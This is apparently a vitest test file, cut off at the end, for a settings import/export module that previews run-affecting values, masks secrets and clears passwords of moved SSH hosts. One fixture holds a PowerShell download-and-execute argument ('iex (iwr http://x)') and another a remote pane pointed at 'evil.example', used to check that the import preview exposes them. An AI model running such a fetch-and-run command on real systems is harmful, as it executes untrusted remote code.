import { describe, expect, it } from "vitest";
import { ImportFailed, SETTINGS_EXCLUDED, SETTINGS_EXPORTED, applyImport, exportConfig, exportableSettings, importableSettings, loadCurrent, loadForPreview, planImport, planShown, readImportFile, type ConfigSection, type Current, type ImportRead, type ListedAutomation, type TransferContext } from "./config-transfer";
import { defaultSettings as defaults } from "./default-settings";
import type { Settings } from "./types";
import type { SshHost, SshForward, Vault } from "./ssh-hosts";

const host = (over: Partial<SshHost>): SshHost => ({
  id: "", label: "", alias: "", group: "", tags: [], hostname: "h.example", port: null, user: "", auth: "key", identityFile: "", jump: "",
  forwardAgent: false, keepalive: 30, env: {}, startup: "", folder: "", tmux: true, notes: "", color: "", terminalTheme: "", os: "", lastConnected: 0, ...over,
});
const forward = (id: string, hostId: string): SshForward => ({ id, hostId, label: id, kind: "local", bindAddress: "", bindPort: 8080, destHost: "localhost", destPort: 80, autoStart: true });

const automation = (over: Partial<ListedAutomation>): ListedAutomation => ({
  id: "", name: "", enabled: true, kind: "claude", prompt: "p", cwd: "C:/work/a", project_id: null, args: [], every: "daily", time: "09:00", weekday: 1,
  last_run: 0, last_session: null, last_error: null, next_run: 0, action: "agent", ...over,
});

let ids = 0;
const newId = () => `new${++ids}`;

function local(): Settings {
  return {
    ...defaults,
    fontSize: 14,
    quickCommands: [
      { id: "q1", label: "Test", text: "npm test", action: "terminal", enter: true, projectId: null },
      { id: "q2", label: "Lint", text: "npm run lint", action: "terminal", enter: true, projectId: "p1" },
    ],
    layouts: [{ id: "l1", name: "Pair", template: { type: "leaf", kind: "claude" } }],
    profiles: [{ kind: "claude", label: "Claude Code", args: [], env: { HOME_ONLY: "x", GITHUB_TOKEN: "local-token" } }],
    accounts: [{ id: "a", agent: "claude", label: "Work", dir: "C:/w" }],
  } as Settings;
}

const strip = ({ os: _os, lastConnected: _lc, ...h }: SshHost) => h;

function fileRead(): ImportRead {
  return {
    doc: {
      kind: "kelpie-config", version: 1, exportedAt: "2026-10-29T00:00:00Z", appVersion: "0.1.7",
      sections: {
        settings: { fontSize: 16, theme: "light", accounts: [{ dir: "x" }], unknownKey: 1, tipsSeen: [3] },
        quickCommands: [
          { id: "q1", label: "Test all", text: "npm test -- --all", action: "terminal", enter: true, projectId: null },
          { id: "other", label: "Lint", text: "pnpm lint", action: "agent", enter: false, projectId: "p1" },
          { id: "", label: "Build", text: "npm run build", action: "terminal", enter: true, projectId: "elsewhere" },
        ],
        layouts: [{ id: "l9", name: "Pair", template: { type: "leaf", kind: "codex" } }, { id: "l2", name: "Trio", template: { type: "leaf", kind: null } }],
        agents: [
          { kind: "claude", label: "Claude Code", args: ["--model", "opus"], permission: "plan", env: [{ name: "GITHUB_TOKEN" }, { name: "NEW_SECRET" }, { name: "PUBLIC", value: "1" }] },
          { kind: "codex", label: "Codex", args: [], env: [{ name: "OPENAI_API_KEY" }] },
        ],
        sshHosts: [
          host({ id: "h-remote", label: "Box", alias: "box", hostname: "10.0.0.5", forwardAgent: true }),
          host({ id: "h-prod", label: "Prod", alias: "prod", hostname: "203.0.113.9", user: "deploy", forwardAgent: true, startup: "cd /srv" }),
          host({ id: "h-new", label: "New", alias: "new", hostname: "new.example", forwardAgent: true }),
        ].map(strip),
        automations: [
          { ...automation({ id: "a1", name: "Nightly", action: "shell", kind: "", shell: { program: "python", argv: ["x.py"] } }), enabled: false, env: [{ name: "TOKEN" }, { name: "PUBLIC", value: "1" }] },
          { ...automation({ id: "zz", name: "Report", cwd: "C:/work/b" }), enabled: false, env: [] },
        ].map(({ last_run: _a, last_session: _b, last_error: _c, next_run: _d, ...a }) => a),
        plugins: [{ id: "acme", name: "Acme" }, { id: "here", name: "Here" }],
      },
    },
    skipped: { quickCommands: 1 },
    ignored: [],
  };
}

function current(): Current {
  return {
    settings: local(),
    projects: [{ id: "p1", path: "C:/work/a" }, { id: "p2", path: "C:\\work\\b\\" }],
    vault: {
      version: 1,
      hosts: [
        host({ id: "h1", label: "Box", alias: "box", hostname: "10.0.0.5", os: "ubuntu", lastConnected: 99, forwardAgent: true }),
        host({ id: "h2", label: "Prod", alias: "prod", hostname: "prod.example", user: "deploy", os: "debian", lastConnected: 7, forwardAgent: true }),
      ],
      forwards: [forward("f1", "h2"), forward("f2", "h1")],
    },
    automations: [automation({ id: "local-a", name: "Nightly", action: "shell", kind: "", shell: { program: "python", argv: ["old.py"], approved_hash: "h" }, command_hash: "h", command_approved: true, env: { TOKEN: "keep-me" }, last_run: 5 })],
    plugins: ["here"],
  };
}

const ALL: ConfigSection[] = ["settings", "quickCommands", "layouts", "automations", "sshHosts", "plugins", "agents"];

describe("settings classification", () => {
  it("puts every default setting in exactly one list, so a new setting must be classified", () => {
    for (const k of Object.keys(defaults)) {
      expect([SETTINGS_EXPORTED.includes(k), SETTINGS_EXCLUDED.includes(k)].filter(Boolean), k).toHaveLength(1);
    }
    for (const k of SETTINGS_EXPORTED) expect(k in defaults, k).toBe(true);
  });

  it("exports the portable keys only", () => {
    const out = exportableSettings({ ...local(), sshConfig: "C:/x", rootYoloOk: ["h"] } as Settings, defaults);
    expect(Object.keys(out).sort()).toEqual([...SETTINGS_EXPORTED].sort());
    expect(out.fontSize).toBe(14);
  });

  it("imports values the settings page allows and names the rest", () => {
    const r = importableSettings({
      fontSize: 0, scrollback: 1e10, uiScale: 40, hibernateMinutes: 0, theme: "purple", language: "fr", keepAwake: "sometimes", resumeSessions: "x",
      lineHeight: 1.5, density: "compact", accounts: [], unknown: 1,
      integrations: { linear: true, jira: { url: "u", email: "e", token: "t" }, gitlabHosts: ["g"] },
    }, defaults);
    expect(r.values).toEqual({ lineHeight: 1.5, density: "compact", integrations: { linear: true, jira: { url: "u", email: "e" }, gitlabHosts: ["g"] } });
    expect(r.invalid.sort()).toEqual(["fontSize", "hibernateMinutes", "keepAwake", "language", "resumeSessions", "scrollback", "theme", "uiScale"]);
    expect(r.unknown.sort()).toEqual(["accounts", "unknown"]);
  });
});

describe("planImport", () => {
  const plan = () => planImport(fileRead(), ALL, current(), { defaults, newId });

  it("counts what is added and what replaces an item with the same id or name", () => {
    const p = plan();
    expect(p.sections.settings).toEqual({ total: 5, add: 0, replace: 2, skipped: 3, changed: ["fontSize", "theme"], unknown: ["accounts", "unknownKey"], invalid: ["tipsSeen"] });
    expect(p.sections.quickCommands).toEqual({ total: 3, add: 1, replace: 2, skipped: 1 });
    expect(p.sections.layouts).toEqual({ total: 2, add: 1, replace: 1, skipped: 0 });
    expect(p.sections.agents).toEqual({ total: 2, add: 1, replace: 1, skipped: 0 });
    expect(p.sections.sshHosts).toEqual({ total: 3, add: 1, replace: 2, skipped: 0 });
    expect(p.sections.automations).toEqual({ total: 2, add: 1, replace: 1, skipped: 0 });
    expect(p.sections.plugins).toEqual({ total: 2, add: 1, replace: 0, skipped: 0 });
    expect(p.missingPlugins).toEqual([{ id: "acme", name: "Acme" }]);
  });

  it("keeps local ids on replace, gives new items an id and drops unknown projects", () => {
    const qc = plan().settings!.quickCommands;
    expect(qc.map((q) => [q.id, q.label, q.text])).toEqual([["q1", "Test all", "npm test -- --all"], ["q2", "Lint", "pnpm lint"], [expect.stringMatching(/^new/), "Build", "npm run build"]]);
    expect(qc[1].projectId).toBe("p1");
    expect(qc[2].projectId).toBeNull();
    expect(plan().settings!.layouts.map((l) => [l.id, l.name])).toEqual([["l1", "Pair"], ["l2", "Trio"]]);
  });

  it("merges agent variables: values replace, names alone keep the local value or are reported", () => {
    const p = plan();
    const claude = p.settings!.profiles.find((x) => x.kind === "claude")!;
    expect(claude).toEqual({ kind: "claude", label: "Claude Code", args: ["--model", "opus"], permission: "plan", env: { HOME_ONLY: "x", GITHUB_TOKEN: "local-token", PUBLIC: "1" } });
    expect(p.envNeeded).toEqual([{ kind: "claude", names: ["NEW_SECRET"] }, { kind: "codex", names: ["OPENAI_API_KEY"] }]);
    expect(p.settings!.accounts).toEqual(local().accounts);
    expect(p.settings!.fontSize).toBe(16);
  });

  it("shows, old → new, every value that decides what runs", () => {
    const read = fileRead();
    read.doc.sections.settings = { ...read.doc.sections.settings, shellArgs: ["pwsh", "-NoExit", "-Command", "iex (iwr http://x)"], agentPermissions: "yolo", agentsScripting: false };
    const runs = planImport(read, ALL, current(), { defaults, newId }).runs;
    const find = (item: string, field: string) => runs.find((r) => r.item === item && r.field === field);
    expect(find("shellArgs", "shellArgs")).toEqual({ section: "settings", item: "shellArgs", field: "shellArgs", before: null, after: 'pwsh -NoExit -Command "iex (iwr http://x)"' });
    expect(find("agentPermissions", "agentPermissions")).toMatchObject({ before: "manual", after: "yolo" });
    expect(find("agentsScripting", "agentsScripting")).toMatchObject({ before: "true", after: "false" });
    expect(find("Claude Code", "args")).toMatchObject({ before: null, after: "--model opus" });
    expect(find("Claude Code", "permission")).toMatchObject({ before: null, after: "plan" });
    expect(find("Claude Code", "env:PUBLIC")).toMatchObject({ before: null, after: "1" });
    expect(find("Claude Code", "env:GITHUB_TOKEN")).toBeUndefined();
    // Quick commands: a replaced one shows its old text, a new one its text; where it goes and Enter too.
    expect(find("Lint", "text")).toMatchObject({ section: "quickCommands", before: "$ npm run lint ⏎", after: "> pnpm lint" });
    expect(find("Build", "text")).toMatchObject({ before: null, after: "$ npm run build ⏎" });
    expect(find("Nightly", "command")).toMatchObject({ section: "automations", before: "python old.py", after: "python x.py" });
    expect(find("Report", "prompt")).toMatchObject({ before: null, after: "p" });
    expect(find("Report", "cwd")).toMatchObject({ before: null, after: "C:/work/b" });
    expect(find("prod", "startup")).toMatchObject({ section: "sshHosts", before: null, after: "cd /srv" });
    // A layout pane that starts on another machine shows where.
    const withRemote = fileRead();
    withRemote.doc.sections.layouts = [{ id: "r", name: "Remote", template: { type: "split", dir: "row", sizes: [0.5, 0.5], children: [{ type: "leaf", kind: "claude", target: { dest: "evil.example", path: "/srv", tmux: true } }, { type: "leaf", kind: null }] } }];
    expect(planImport(withRemote, ["layouts"], current(), { defaults, newId }).runs).toEqual([{ section: "layouts", item: "Remote", field: "remote", before: null, after: "claude @ evil.example /srv" }]);
    // Unchanged values are not listed.
    expect(runs.some((r) => r.item === "Nightly" && r.field === "cwd")).toBe(false);
    expect(planImport(read, ["layouts", "plugins"], current(), { defaults, newId }).runs).toEqual([]);
  });

  it("a host that now connects elsewhere loses the password, agent forwarding and port forwards", () => {
    const p = plan();
    const [box, prod, added] = p.vault!.hosts;
    expect(box).toMatchObject({ id: "h1", hostname: "10.0.0.5", os: "ubuntu", lastConnected: 99, forwardAgent: true });
    expect(prod).toMatchObject({ id: "h2", hostname: "203.0.113.9", os: "", lastConnected: 0, forwardAgent: false });
    expect(added).toMatchObject({ id: "h-new", forwardAgent: false });
    expect(p.hostTargets).toEqual([{ id: "h2", alias: "prod", before: "deploy@prod.example", after: "deploy@203.0.113.9", forwards: 1 }]);
    expect(p.vault!.forwards.map((f) => f.id)).toEqual(["f2"]);
  });

  it("brings automations in switched off, unapproved, with no history", () => {
    const [nightly, report] = plan().automations;
    expect(nightly.replaces?.id).toBe("local-a");
    expect(nightly.next).toMatchObject({ id: "local-a", enabled: false, last_run: 0, next_run: 0, env: { TOKEN: "keep-me", PUBLIC: "1" }, project_id: "p1" });
    expect(nightly.next.shell).toEqual({ program: "python", argv: ["x.py"] });
    expect(JSON.stringify(nightly.next)).not.toMatch(/approved_hash|"approval"|command_hash|command_approved/);
    expect(report.replaces).toBeNull();
    expect(report.next).toMatchObject({ id: "zz", enabled: false, project_id: "p2" });
  });

  it("plans only the chosen sections", () => {
    const p = planImport(fileRead(), ["layouts"], current(), { defaults, newId });
    expect(Object.keys(p.sections)).toEqual(["layouts"]);
    expect(p.settings!.fontSize).toBe(14);
    expect(p.vault).toBeNull();
    expect(p.automations).toEqual([]);
  });
});

/** A computer in memory: app settings, the hosts file, saved passwords and the daemon's automations. */
function machine(opts: { refuse?: string; daemonGone?: boolean; keepRefused?: boolean; failHosts?: boolean; failSettingsSave?: boolean; failForget?: string; canSave?: boolean; onBackup?: () => void } = {}) {
  const cur = current();
  const m = {
    settings: cur.settings,
    saved: JSON.stringify(cur.settings),
    vault: cur.vault as Vault,
    passwords: new Set(["h1", "h2"]),
    automations: new Map<string, ListedAutomation>(cur.automations!.map((a): [string, ListedAutomation] => [a.id, a])),
    approvals: [] as string[],
    calls: [] as string[],
    backups: 0,
    down: false,
    refusedOnce: false,
  };
  const list = () => [...m.automations.values()];
  const ctx: TransferContext = {
    settings: () => m.settings,
    defaults,
    appState: () => ({ settings: m.settings }),
    projects: () => cur.projects,
    canSave: () => opts.canSave ?? true,
    replaceSettings: (next) => {
      m.settings = JSON.parse(JSON.stringify(next));
    },
    saveNow: async () => {
      m.calls.push("saveNow");
      if (opts.failSettingsSave) throw new Error("disk full");
      m.saved = JSON.stringify(m.settings);
    },
    automationsSupported: () => true,
    daemon: async <T,>(method: string, params: any = {}): Promise<T> => {
      m.calls.push(method);
      // The connection dropped at the refusal: the next call (the state check) fails, then it is back.
      if (m.down) {
        m.down = false;
        throw new Error("not connected");
      }
      if (method === "automation.state") return { error: null } as T;
      if (method === "automation.list") return JSON.parse(JSON.stringify(list())) as T;
      if (method === "automation.save") {
        // The first save of that automation is refused; a later one (the undo putting it back) goes through.
        if (opts.refuse && params.name === opts.refuse && !m.refusedOnce) {
          m.refusedOnce = true;
          if (opts.daemonGone) m.down = true;
          // A daemon that changed its list in memory and then failed to write it.
          if (opts.keepRefused) m.automations.set(params.id, { ...params, command_approved: false });
          throw new Error("unknown agent kind");
        }
        const a = { ...params, command_approved: false } as ListedAutomation;
        m.automations.set(a.id, a);
        return a as T;
      }
      if (method === "automation.delete") {
        m.automations.delete(params.id);
        return true as T;
      }
      if (method === "automation.approve") {
        m.approvals.push(`${params.id}:${params.hash}`);
        m.automations.get(params.id)!.command_approved = true;
        return true as T;
      }
      throw new Error(`unexpected ${method}`);
    },
    invoke: async <T,>(cmd: string, args: any = {}): Promise<T> => {
      m.calls.push(cmd);
      if (cmd === "config_hosts_current") {
        if (opts.failHosts) throw new Error("the saved SSH hosts could not be read: denied");
        return JSON.parse(JSON.stringify(m.vault)) as T;
      }
      if (cmd === "config_hosts_write") {
        expect(args.expected).toEqual(m.vault);
        m.vault = JSON.parse(JSON.stringify(args.vault));
        return m.vault as T;
      }
      if (cmd === "plugin_list") return [{ id: "here" }] as T;
      if (cmd === "config_backup") {
        m.backups++;
        opts.onBackup?.();
        return "C:/data/backups/config-1" as T;
      }
      if (cmd === "config_import_read") throw new Error("not a Kelpie settings file: expected value at line 1 column 1");
      throw new Error(`unexpected ${cmd}`);
    },
    forgetPassword: async (hostId) => {
      m.calls.push("forgetPassword");
      if (hostId === opts.failForget) throw new Error("credential store locked");
      m.passwords.delete(hostId);
    },
    newId,
  };
  const rest = () => JSON.stringify({ settings: m.settings, saved: m.saved, vault: m.vault, automations: list().map(({ command_approved, ...a }) => ({ ...a, command_approved })) });
  const snapshot = () => JSON.stringify({ rest: rest(), passwords: [...m.passwords] });
  return { m, ctx, snapshot, rest };
}

async function previewOn(ctx: TransferContext, chosen = ALL) {
  return planImport(fileRead(), chosen, await loadCurrent(chosen, ctx), { defaults, newId: () => "preview-id" });
}
const checked = { runsChecked: true };

describe("applyImport", () => {
  it("backs up first, then applies hosts, settings and automations, and forgets a moved host's password", async () => {
    const { m, ctx } = machine();
    const r = await applyImport(fileRead(), ALL, await previewOn(ctx), ctx, checked);
    expect(r.backup).toBe("C:/data/backups/config-1");
    const firstWrite = m.calls.findIndex((c) => ["config_hosts_write", "saveNow", "automation.save"].includes(c));
    expect(m.calls.indexOf("config_backup")).toBeLessThan(firstWrite);
    // Forgotten after the backup and before anything is saved.
    expect(m.calls.indexOf("config_backup")).toBeLessThan(m.calls.indexOf("forgetPassword"));
    expect(m.calls.indexOf("forgetPassword")).toBeLessThan(firstWrite);
    expect([...m.passwords]).toEqual(["h1"]);
    expect(m.vault.hosts.map((h) => h.id)).toEqual(["h1", "h2", "h-new"]);
    expect(m.vault.forwards.map((f) => f.id)).toEqual(["f2"]);
    expect(JSON.parse(m.saved).fontSize).toBe(16);
    expect([...m.automations.values()].map((a) => [a.id, a.enabled, a.command_approved])).toEqual([["local-a", false, false], ["zz", false, false]]);
    expect(r.refused).toEqual([]);
  });

  it("needs the run check when values that decide what runs change", async () => {
    const { m, ctx } = machine();
    await expect(applyImport(fileRead(), ALL, await previewOn(ctx), ctx, { runsChecked: false })).rejects.toThrow("tick the box");
    expect(m.backups).toBe(0);
    // A section that runs nothing needs no check.
    await applyImport(fileRead(), ["layouts"], await previewOn(ctx, ["layouts"]), ctx, { runsChecked: false });
    expect(m.backups).toBe(1);
  });

  it("refuses when what runs differs from what the preview showed", async () => {
    const { m, ctx } = machine();
    const preview = await previewOn(ctx);
    m.settings = { ...m.settings, profiles: [{ ...m.settings.profiles[0], args: ["--other"] }] } as Settings;
    await expect(applyImport(fileRead(), ALL, preview, ctx, checked)).rejects.toThrow("changed since the preview");
    expect(m.backups).toBe(0);
  });

  it("skips and reports an automation the daemon refuses, keeping the rest of the import", async () => {
    const { m, ctx } = machine({ refuse: "Report" });
    const r = await applyImport(fileRead(), ALL, await previewOn(ctx), ctx, checked);
    expect(r.refused).toEqual([{ name: "Report", error: "unknown agent kind" }]);
    expect(m.automations.has("zz")).toBe(false);
    expect(m.automations.get("local-a")!.enabled).toBe(false);
    expect(JSON.parse(m.saved).fontSize).toBe(16);
  });

  it("undoes everything when the daemon goes away, and restores the user's approval", async () => {
    const { m, ctx, rest } = machine({ refuse: "Report", daemonGone: true });
    const before = rest();
    const err = await applyImport(fileRead(), ALL, await previewOn(ctx), ctx, checked).catch((e) => e);
    expect(err).toBeInstanceOf(ImportFailed);
    expect(err.reason).toContain("unknown agent kind");
    expect(err.undoFailures).toEqual([]);
    expect(m.approvals).toEqual(["local-a:h"]);
    expect(rest()).toEqual(before);
    // The moved host's password stays cleared, and the error says so instead of "nothing was changed".
    expect([...m.passwords]).toEqual(["h1"]);
    expect(err.forgotten).toEqual(["prod"]);
    expect(err.message).not.toContain("nothing was changed");
    expect(err.message).toContain("passwords of moved hosts were cleared: prod");
  });

  it("undoes the hosts when the settings cannot be saved; the moved host's password stays cleared", async () => {
    const { m, ctx, rest } = machine({ failSettingsSave: true });
    const before = rest();
    const err = await applyImport(fileRead(), ["sshHosts", "settings"], await previewOn(ctx, ["sshHosts", "settings"]), ctx, checked).catch((e) => e);
    expect(err).toBeInstanceOf(ImportFailed);
    expect(JSON.parse(rest()).vault).toEqual(JSON.parse(before).vault);
    expect([...m.passwords]).toEqual(["h1"]);
    expect(err.message).toContain("cleared: prod");
  });

  it("a password that cannot be forgotten stops the import before anything is saved", async () => {
    const read = fileRead();
    // Both hosts now connect elsewhere; the second forget fails.
    read.doc.sections.sshHosts![0] = { ...read.doc.sections.sshHosts![0], hostname: "10.9.9.9" };
    const { m, ctx, rest } = machine({ failForget: "h2" });
    const before = rest();
    const preview = planImport(read, ALL, await loadCurrent(ALL, ctx), { defaults, newId });
    expect(preview.hostTargets.map((h) => h.id)).toEqual(["h1", "h2"]);
    const err = await applyImport(read, ALL, preview, ctx, checked).catch((e) => e);
    expect(err).toBeInstanceOf(ImportFailed);
    expect(err.forgotten).toEqual(["box"]);
    expect(err.message).toContain("credential store locked");
    expect(err.message).toContain("nothing else was changed");
    expect(err.message).toContain("cleared: box");
    expect(m.calls.filter((c) => /config_hosts_write|saveNow|automation\.save/.test(c))).toEqual([]);
    expect(rest()).toEqual(before);
    expect([...m.passwords]).toEqual(["h2"]);
  });

  it("an automation the daemon kept although it reported a failure fails the import and is undone", async () => {
    const { m, ctx } = machine({ refuse: "Report", keepRefused: true });
    const err = await applyImport(fileRead(), ALL, await previewOn(ctx), ctx, checked).catch((e) => e);
    expect(err).toBeInstanceOf(ImportFailed);
    expect(m.automations.has("zz")).toBe(false);
    expect(m.automations.get("local-a")!.shell!.argv).toEqual(["old.py"]);
  });

  it("keeps a setting changed while the backup was written", async () => {
    const holder: { m?: ReturnType<typeof machine>["m"] } = {};
    const made = machine({ onBackup: () => (holder.m!.settings = { ...holder.m!.settings, wordWrap: true } as Settings) });
    holder.m = made.m;
    await applyImport(fileRead(), ["settings"], await previewOn(made.ctx, ["settings"]), made.ctx, checked);
    expect(JSON.parse(made.m.saved)).toMatchObject({ wordWrap: true, fontSize: 16 });
  });

  it("changes nothing when the current configuration cannot be read", async () => {
    const { m, ctx } = machine({ failHosts: true });
    const preview = planImport(fileRead(), ALL, current(), { defaults, newId });
    await expect(applyImport(fileRead(), ALL, preview, ctx, checked)).rejects.toThrow("could not be read");
    expect(m.backups).toBe(0);
    expect(m.calls.filter((c) => /write|save|delete|forget/.test(c))).toEqual([]);
  });

  it("refuses when the configuration moved since the preview", async () => {
    const { m, ctx } = machine();
    const preview = await previewOn(ctx);
    m.settings = { ...m.settings, theme: "light" } as Settings;
    await expect(applyImport(fileRead(), ALL, preview, ctx, checked)).rejects.toThrow("changed since the preview");
    expect(m.backups).toBe(0);
  });

  it("refuses app sections when app state cannot be saved", async () => {
    const { m, ctx } = machine({ canSave: false });
    await expect(applyImport(fileRead(), ["layouts"], await previewOn(ctx, ["layouts"]), ctx, checked)).rejects.toThrow("cannot be saved");
    expect(m.calls).not.toContain("saveNow");
  });

  it("a file that cannot be read changes nothing", async () => {
    const { m, ctx, snapshot } = machine();
    const before = snapshot();
    await expect(readImportFile("C:/bad.json", ctx)).rejects.toThrow("not a Kelpie settings file");
    expect(m.calls).toEqual(["config_import_read"]);
    expect(snapshot()).toEqual(before);
  });
});

describe("masked values", () => {
  const M = "[redacted]";
  const masked = () => {
    const read = fileRead();
    const s = read.doc.sections;
    s.settings = { ...s.settings, integrations: { linear: true, jira: { url: `https://me:${M}@jira.example.com`, email: "e" }, gitlabHosts: [] }, shellArgs: ["pwsh", "--token", M] };
    s.agents = [
      { kind: "claude", label: "Claude Code", args: ["--model", "opus", "--api-key", M, "--token=" + M], env: [{ name: "PUBLIC", value: `Bearer ${M}` }] },
      { kind: "codex", label: "Codex", args: ["--api-key", M, "--search", "-c", `api_key=${M}`], env: [] },
    ];
    s.quickCommands = [
      { id: "q1", label: "Test", text: `curl -u admin:${M} x`, action: "terminal", enter: true, projectId: null },
      { id: "qx", label: "Deploy", text: `deploy --token ${M}`, action: "terminal", enter: true, projectId: null },
    ];
    s.sshHosts = [strip(host({ id: "h-remote", alias: "box", hostname: "10.0.0.5", notes: `key ${M}` })), strip(host({ id: "h-new", alias: "new", hostname: "n.example", notes: `pw ${M}`, env: { LANG: "C", SECRETISH: `x ${M}` } }))];
    s.automations = [
      { ...automation({ id: "a1", name: "Nightly", action: "shell", kind: "", shell: { program: "python", argv: ["x.py", "--token", M] } }), enabled: false, env: [] },
      { ...automation({ id: "zz", name: "Report", prompt: `use ${M}` }), enabled: false, env: [] },
    ].map(({ last_run: _a, last_session: _b, last_error: _c, next_run: _d, ...a }) => a);
    return read;
  };
  const cur = () => {
    const c = current();
    c.settings = { ...c.settings, shellArgs: ["pwsh", "--token", "localtok"], integrations: { linear: false, jira: { url: "https://jira.local", email: "me" }, gitlabHosts: [] } } as Settings;
    c.settings.profiles = [{ kind: "claude", label: "Claude Code", args: ["--api-key", "realkey", "--token=tok1", "--model", "sonnet"] }];
    c.vault!.hosts[0] = { ...c.vault!.hosts[0], notes: "local notes" };
    c.automations![0] = { ...c.automations![0], shell: { program: "python", argv: ["old.py", "--token", "localtok"] } };
    return c;
  };

  it("take this computer's value, so a round trip of your own export keeps the arguments working", () => {
    const p = planImport(masked(), ALL, cur(), { defaults, newId });
    const claude = p.settings!.profiles.find((x) => x.kind === "claude")!;
    expect(claude.args).toEqual(["--model", "opus", "--api-key", "realkey", "--token=tok1"]);
    expect(p.settings!.shellArgs).toEqual(["pwsh", "--token", "localtok"]);
    expect(p.settings!.integrations.jira).toEqual({ url: "https://jira.local", email: "me" });
    expect(p.settings!.quickCommands.find((q) => q.id === "q1")!.text).toBe("npm test");
    expect(p.vault!.hosts.find((h) => h.id === "h1")!.notes).toBe("local notes");
    expect(p.automations.find((a) => a.next.name === "Nightly")!.next.shell!.argv).toEqual(["x.py", "--token", "localtok"]);
  });

  it("without a value here: a profile's arguments are not imported, an item that needs it is left out, both are listed", () => {
    const p = planImport(masked(), ALL, cur(), { defaults, newId });
    const codex = p.settings!.profiles.find((x) => x.kind === "codex")!;
    // Codex is new here and `-c api_key=[redacted]` has no value: no arguments rather than a `-c` with
    // nothing after it.
    expect(codex.args).toEqual([]);
    expect(p.argsNotImported).toEqual([{ section: "agents", item: "Codex" }]);
    expect(p.settings!.quickCommands.some((q) => q.label === "Deploy")).toBe(false);
    expect(p.automations.some((a) => a.next.name === "Report")).toBe(false);
    const added = p.vault!.hosts.find((h) => h.id === "h-new")!;
    expect(added.notes).toBe("");
    expect(added.env).toEqual({ LANG: "C" });
    expect(p.fillIn).toEqual([
      { section: "quickCommands", item: "Deploy", fields: ["content"], leftOut: true },
      { section: "sshHosts", item: "new", fields: ["notes", "env:SECRETISH"], leftOut: false },
      { section: "automations", item: "Report", fields: ["prompt"], leftOut: true },
    ]);
    expect(p.envNeeded).toEqual([{ kind: "claude", names: ["PUBLIC"] }]);
    expect(p.sections.quickCommands!.skipped).toBe(2);
    expect(p.sections.automations!.skipped).toBe(1);
    // The marker is never written into this computer's configuration.
    expect(JSON.stringify([p.settings, p.vault, p.automations.map((a) => a.next)])).not.toContain(M);
  });
});

describe("masked arguments are matched by position, never by guess", () => {
  const M = "[redacted]";
  /** Plans one Claude profile with `args` from the file over this computer's `local` arguments. */
  const agentArgs = (args: string[], local?: string[]) => {
    const read = fileRead();
    read.doc.sections.agents = [{ kind: "claude", label: "Claude Code", args, env: [] }];
    const cur = current();
    cur.settings.profiles = local ? [{ kind: "claude", label: "Claude Code", args: local }] : [];
    const p = planImport(read, ["agents"], cur, { defaults, newId });
    return { args: p.settings!.profiles.find((x) => x.kind === "claude")!.args, fill: p.fillIn, kept: p.keptLocal, notImported: p.argsNotImported };
  };
  /** The file's arguments were not used: this computer's stay, the profile is named and nothing is left to fill in. */
  const notImported = (args: string[], local?: string[]) => {
    const r = agentArgs(args, local);
    expect(r.args).toEqual(local ?? []);
    expect(r.notImported).toEqual([{ section: "agents", item: "Claude Code" }]);
    expect(r.fill).toEqual([]);
    expect(r.kept).toEqual([]);
  };

  it("does not import a profile's arguments when a masked one has no value here", () => {
    // Codex's `-c api_key=…`: never a `-c` with nothing after it.
    notImported(["--search", "-c", `api_key=${M}`]);
    notImported(["--search", "-c", `api_key=${M}`], ["--model", "o3"]);
    // A safety flag in front of a masked positional is not dropped either: the whole list stays as it was here.
    notImported(["--read-only", `https://u:${M}@db/x`]);
    notImported(["--read-only", `https://u:${M}@db/x`], ["--read-only", "--model", "opus"]);
    // Even when another masked argument could be filled in.
    notImported(["--api-key", M, "-c", `api_key=${M}`], ["--api-key", "realkey"]);
  });

  it("imports the arguments when every masked one is filled in from here", () => {
    const r = agentArgs(["--search", "-c", `api_key=${M}`], ["-c", "api_key=real"]);
    expect(r.args).toEqual(["--search", "-c", "api_key=real"]);
    expect(r.notImported).toEqual([]);
    expect(r.kept).toEqual([{ section: "agents", item: "Claude Code", fields: ["args:api_key"] }]);
  });

  it("pairs a flag only with an exact marker, and takes the same occurrence of that flag here", () => {
    notImported(["--token", M, "--model", "opus"]);
    expect(agentArgs(["--token", M, "--token", M], ["--token", "first", "--token", "second"]).args).toEqual(["--token", "first", "--token", "second"]);
    // A local flag followed by another flag has no value to take.
    notImported(["--token", M], ["--token", "--verbose"]);
  });

  it("takes a repeated header only from the same occurrence with the same header name", () => {
    const local = ["-H", "Accept: x", "-H", "Authorization: Bearer real"];
    // Same position, other header: no value here.
    notImported(["-H", `Authorization: Bearer ${M}`], local);
    expect(agentArgs(["-H", "Accept: x", "-H", `Authorization: Bearer ${M}`], local).args).toEqual(local);
  });

  it("takes a masked positional from the same index only when both lists have the same shape", () => {
    expect(agentArgs(["run", `https://u:${M}@h`], ["run", "https://u:pw@h"]).args).toEqual(["run", "https://u:pw@h"]);
    notImported(["run", `https://u:${M}@h`], ["run", "--other", "https://u:pw@h"]);
    expect(agentArgs([`api_key=${M}`, `api_key=${M}`], ["api_key=one", "x", "api_key=two"]).args).toEqual(["api_key=one", "api_key=two"]);
  });

  /** Plans the file's terminal arguments `args` over this computer's `local` ones. */
  const terminal = (args: string[], local: string[]) => {
    const read = fileRead();
    read.doc.sections.settings = { ...read.doc.sections.settings, shellArgs: args };
    const cur = current();
    cur.settings.shellArgs = local;
    return planImport(read, ["settings"], cur, { defaults, newId });
  };

  it("keeps this computer's terminal arguments whole when a masked one has no value here", () => {
    const p = terminal(["codex", "-c", `api_key=${M}`], ["pwsh", "-NoLogo"]);
    expect(p.settings!.shellArgs).toEqual(["pwsh", "-NoLogo"]);
    expect(p.argsNotImported).toEqual([{ section: "settings", item: "shellArgs" }]);
    expect(p.sections.settings!.changed).not.toContain("shellArgs");
    expect(p.fillIn).toEqual([]);
    expect(terminal(["pwsh", "-NoLogo", `https://u:${M}@h`], ["bash"]).settings!.shellArgs).toEqual(["bash"]);
  });

  it("imports terminal arguments whose masked ones are all filled in from here", () => {
    const p = terminal(["codex", "--search", "-c", `api_key=${M}`], ["pwsh", "-c", "api_key=real"]);
    expect(p.settings!.shellArgs).toEqual(["codex", "--search", "-c", "api_key=real"]);
    expect(p.argsNotImported).toEqual([]);
    expect(p.keptLocal).toEqual([{ section: "settings", item: "shellArgs", fields: ["args:api_key"] }]);
  });

  /** Plans one agent automation "Review" with `args` from the file, over a local one with `local` arguments
   *  (none: the automation is new here). */
  const agentAutomation = (args: string[], local?: string[]) => {
    const read = fileRead();
